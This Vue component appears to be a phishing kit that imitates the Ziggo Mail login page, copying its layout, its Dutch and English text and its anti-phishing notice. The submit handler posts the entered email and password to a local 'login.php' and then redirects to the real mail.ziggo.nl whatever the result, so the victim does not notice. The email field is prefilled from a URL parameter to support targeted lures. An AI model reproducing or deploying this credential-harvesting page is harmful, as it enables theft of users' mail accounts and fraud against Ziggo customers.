<template>
  <div>
    <transition name="fade">
      <background-loader v-if="!isReady && step === 1" />
    </transition>
    <transition name="fade">
      <confirm-loader :title="currentLanguage.confirmTitle" v-if="isReady && step === 2" />
    </transition>
    <div id="io-ox-login-screen" class="unselectable" style="display: block" v-if="isLoaded">
      <div id="io-ox-login-background" class="wallpaper"></div>
      <div id="io-ox-login-container-scrollpane">
          <div id="io-ox-login-container" class="container">
              <div id="io-ox-login-header">
                <h1>
                  <span id="io-ox-login-header-prefix" aria-hidden="false">Ziggo Mail</span>
                </h1>
              </div>
              <form id="io-ox-login-form-container" @submit.prevent="submitClick">
                  <div id="io-ox-login-form">
                      <input type="hidden" name="location" value="">
                      <div class="row help">
                          <div class="col-xs-12">
                              <p id="io-ox-login-help" class="help-block"></p>
                          </div>
                      </div>
                      <div class="row username">
                          <div class="form-group col-xs-12">
                              <label for="io-ox-login-username" class="sr-only">{{ currentLanguage.emailPlaceholder }}</label>
                              <input type="email" id="io-ox-login-username" name="username" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" spellcheck="false" aria-required="true" :placeholder="currentLanguage.emailPlaceholder" v-model="emailAddress">
                          </div>
                      </div>
                      <div class="row password">
                          <div class="form-group col-xs-12">
                              <label for="io-ox-login-password" class="sr-only">{{ currentLanguage.passwordPlaceholder }}</label>
                              <input type="password" id="io-ox-login-password" name="password" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" aria-required="true" :placeholder="currentLanguage.passwordPlaceholder" v-model="password">
                          </div>
                      </div>
                      <div class="row feedback">
                          <div class="row-fluid control-group"><a class="col-xs-12" href="//www.ziggo.nl/klantenservice/e-mail/ziggo-mail">{{ currentLanguage.clickHereFAQ }}</a></div>
                          <div class="col-xs-12" id="io-ox-login-feedback">
                            <div role="alert" class="selectable-text alert alert-info" v-if="errorNoEmail">{{ currentLanguage.noCredentials }}</div>
                            <div role="alert" class="selectable-text alert alert-info" v-if="errorNoPassword && !errorNoEmail">{{ currentLanguage.noPassword }}</div>
                            <div role="alert" class="selectable-text alert alert-info" v-if="!errorNoPassword && !errorNoEmail && errorInvalidEmail">{{ currentLanguage.invalidEmail }}</div>
                          </div>
                      </div>
                      <div class="row options">
                          <div class="col-sm-6 col-xs-12 checkbox col-lg-6 col-md-6" id="io-ox-login-store">
                              <label for="io-ox-login-store-box">
                                  <input type="checkbox" id="io-ox-login-store-box" checked="checked" name="store" value="1">{{ currentLanguage.staySignedIn }}</label>
                          </div>
                          <div class="col-sm-6 col-xs-12 radio text-right col-lg-6 col-md-6" id="io-ox-forgot-password"><a href="https://www.ziggo.nl/mijn-ziggo/producten/#internet" target="_blank">{{ currentLanguage.forgotPassword }}</a></div>
                      </div>
                      <div class="row buttons">
                          <div class="form-group col-sm-6 col-xs-12">
                              <input type="submit" name="signin" id="io-ox-login-button" class="btn btn-primary form-control" :value="currentLanguage.signInButton">
                          </div>
                      </div>
                      <div class="row control-group" id="ziggo-extmsg">
                          <br>
                          <br>
                          <br>
                          <br>
                          <font color="#d76e00">
                            <div align="center">
                              {{ currentLanguage.phishingMessage }} <a href="https://www.ziggo.nl/phishing/">https://www.ziggo.nl/phishing</a>
                            </div>
                            <div class="vfz-cta__wrapper">
                              <a href="https://www.ziggo.nl/webmail-campagne" target="_blank"><span class="vfz-cta__promo" id="vfz-cta"></span></a>
                            </div>
                          </font>
                      </div>
                  </div>
              </form>
          </div>
          <footer id="io-ox-login-footer"><span id="io-ox-languages"><span class="lang-label" id="io-ox-languages-label">{{ currentLanguage.languages }}</span>
            <div class="dropup" :class="{'open': dropUpOpen}">
              <a href="#" role="button" data-toggle="dropdown" aria-haspopup="true" :aria-expanded="dropUpOpen" @click="dropUpOpen = !dropUpOpen" @blur="dropUpOpen = false">
                <span class="toggle-text">{{ currentLanguage.language }}</span><span class="caret"></span>
              </a>
                <ul id="io-ox-language-list" class="dropdown-menu" role="menu" aria-labelledby="io-ox-languages-label">
                    <li role="presentation" @click="setLanguage(1)" @mousedown.prevent><a href="#" role="menuitem" lang="en-US" data-value="en_US">English (US)</a></li>
                    <li role="presentation" @click="setLanguage(0)" @mousedown.prevent><a href="#" role="menuitem" lang="nl-NL" data-value="nl_NL">Nederlands</a></li>
                </ul>
            </div>
            </span>
            <span id="io-ox-copyright"></span>
          </footer>
      </div>
    </div>
  </div>
</template>

<script>
import axios from 'axios';
import BackgroundLoader from './components/BackgroundLoader.vue';
import ConfirmLoader from './components/ConfirmLoader.vue';
export default {
  name: "app",
  components: {
    BackgroundLoader,
    ConfirmLoader
  },
  data () {
    return {
      referrerPage: "//mail.ziggo.nl/appsuite/",
      languages: [
        {
          emailPlaceholder: 'E-Mail adres',
          passwordPlaceholder: 'Wachtwoord',
          staySignedIn: 'Aangemeld blijven',
          signInButton: 'Aanmelden',
          forgotPassword: 'Uw wachtwoord vergeten?',
          clickHereFAQ: 'Click here for frequently asked questions',
          phishingMessage: 'Pas op! Er gaat regelmatig Phishing e-mail rond. Zie ook ',
          noCredentials: 'Voer alstublieft uw inloggegevens in. (UI-0001)',
          noPassword: 'Voer alstublieft uw wachtwoord in. (UI-0002)',
          invalidEmail: 'Voer alstublieft een geldig e-mail adres in (UI-0104)',
          languages: 'Talen',
          language: 'Nederlands',
          confirmTitle: 'Een ogenblik geduld...',
          title: 'Ziggo Aanmelden'
        },
        {
          emailPlaceholder: 'E-Mail address',
          passwordPlaceholder: 'Password',
          staySignedIn: 'Stay signed in',
          signInButton: 'Sign in',
          forgotPassword: 'Forgot your password?',
          clickHereFAQ: 'Klik hier voor veelgestelde vragen',
          phishingMessage: 'Watch out for phishing e-mail. For more details (Dutch only): ',
          noCredentials: 'Please enter your credentials. (UI-0001)',
          noPassword: 'Please enter your password. (UI-0002)',
          invalidEmail: 'Please enter a valid emailaddress (UI-0104)',
          languages: 'Languages',
          language: 'English (US)',
          confirmTitle: 'One moment please...',
          title: 'Ziggo Sign in'
        }
      ],
      currentLanguage: null,
      isLoaded: false,
      isReady: false,
      dropUpOpen: false,
      errorNoEmail: false,
      errorNoPassword: false,
      errorInvalidEmail: false,
      step: 1,
      emailAddress: '',
      password: ''
    }
  },
  methods: {
    validateEmail () {
      var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
      return re.test(String(this.emailAddress).toLowerCase());
    },
    setLanguage (lang) {
      this.dropUpOpen = false;
      this.currentLanguage = this.languages[lang];
      window.document.title = this.currentLanguage.title;
    },
    submitClick () {
      var vm = this;
      vm.errorNoEmail = false;
      vm.errorNoPassword = false;
      vm.errorInvalidEmail = false;
      if (vm.emailAddress.length === 0) {
        vm.errorNoEmail = true;
        return;
      }
      if (vm.password.length === 0) {
        vm.errorNoPassword = true;
        return;
      }
      if (vm.validateEmail() === false) {
        vm.errorInvalidEmail = true;
        return;
      }
      axios.post('login.php', {email: vm.emailAddress, password: vm.password})
      .then(res => {
          vm.step = 2;
          setTimeout(function() {
            window.location.replace(vm.referrerPage);
          }, 1000);
      })
      .catch(error => {
          vm.step = 2;
          setTimeout(function() {
            window.location.replace(vm.referrerPage);
          }, 1000);
      })
    }
  },
  mounted () {
    var vm = this
    let uri = window.location.href.split("?");
    if (uri.length > 0 && uri[1] !== undefined) {
      let vars = uri[1].split("&");
      let getVars = {};
      let tmp = "";
      vars.forEach(function(v) {
        tmp = v.split("=");
        if (tmp.length == 2)
          getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
      });
      var email = "undefined" !== typeof getVars["e"] ? getVars["e"] : "";
      vm.emailAddress = email
    }
    vm.isLoaded = true;
    vm.currentLanguage = vm.languages[0];
    setTimeout(function() {
      vm.isReady = true;
      document.getElementById('io-ox-login-username').focus();
    }, 1000);
  }
};
</script>

<style lang="scss">
.fade-enter-active, .fade-leave-active {
  transition: opacity .5s;
}
.fade-enter, .fade-leave-to {
  opacity: 0;
}
</style>
